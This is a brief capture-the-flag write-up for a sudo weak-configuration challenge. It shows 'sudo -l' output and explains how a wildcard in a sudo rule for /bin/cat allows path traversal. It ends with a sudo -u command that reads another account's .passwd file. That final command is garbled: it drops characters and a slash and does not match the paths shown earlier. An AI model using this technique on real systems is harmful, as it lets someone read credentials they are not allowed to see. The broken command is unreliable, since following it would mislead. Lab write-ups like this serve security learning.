// link to challenge: https://www.root-me.org/en/Challenges/App-Script/sudo-weak-configuration

// use sudo -l to see what permission is available.
$ sudo -l
[sudo] password for app-script-ch1:
Matching Defaults entries for app-script-ch1 on challenge02:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms, !mail_no_user

User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/ *

// We can firgure out the read permission using cat command for "app-script-ch1-cracked" account on the directory "/challenge/app-script/ch1/note/". The important thing here is "*". It means any things follow the ".../notes/" is available to read permission of the "app-script-ch1-cracked" account. So we can replace "*" by the path to ".passwd" file ("../ch1cracked/.passwd" in this case)
// Use "ls -l" command to check the permission of "passwd" file to verify the idea above:

$ ls -l ch1cracked/.passwd
-r--r----- 1 app-script-ch1-cracked app-script-ch1-cracked 21 Nov  6 18:16 ch1cracked/.passwd

// Using "sudo -u <user> command" to execute the "command" by "user" account.
sudo -u app-script-ch-cracked /bin/cat /challenge/app-script/ch/notes/..chcracked/.passwd

==> Then we capture the flag.

